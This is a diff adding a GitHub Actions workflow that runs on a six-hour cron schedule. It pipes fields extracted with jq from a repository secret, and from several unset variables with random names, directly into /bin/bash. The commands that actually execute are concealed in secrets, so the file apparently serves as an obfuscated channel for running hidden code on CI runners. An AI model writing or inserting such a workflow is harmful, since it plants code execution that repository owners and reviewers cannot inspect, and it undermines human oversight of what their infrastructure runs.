@@ -1,0 +1,29 @@
+name: duobidekonjian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duobidekonjian
+        env:
+          lir086: ${{ secrets.lir086 }}
+        run: |
+          echo $lir086 | jq -r .jdyc043 | /bin/bash
+          echo $j07 | jq -r .sr6589 | /bin/bash
+          echo $him06 | jq -r .f6240 | /bin/bash
+          echo $cnbfg28392 | jq -r .vog21375 | /bin/bash
+          echo $zf7538 | jq -r .jcg2 | /bin/bash
+          echo $jjafb49769 | jq -r .n4 | /bin/bash
+          echo $eynwb4 | jq -r .w29 | /bin/bash
+          echo $o81774 | jq -r .grfm37084 | /bin/bash
+          echo $dnxxi21750 | jq -r .uhky8 | /bin/bash
+          echo $asi06334 | jq -r .bhci163 | /bin/bash
+          echo $clnl74 | jq -r .qx74 | /bin/bash
+          echo $xyj4908 | jq -r .c1065 | /bin/bash
+          echo $b40461 | jq -r .t6986 | /bin/bash
+          echo $nkatm50855 | jq -r .is202 | /bin/bash
+
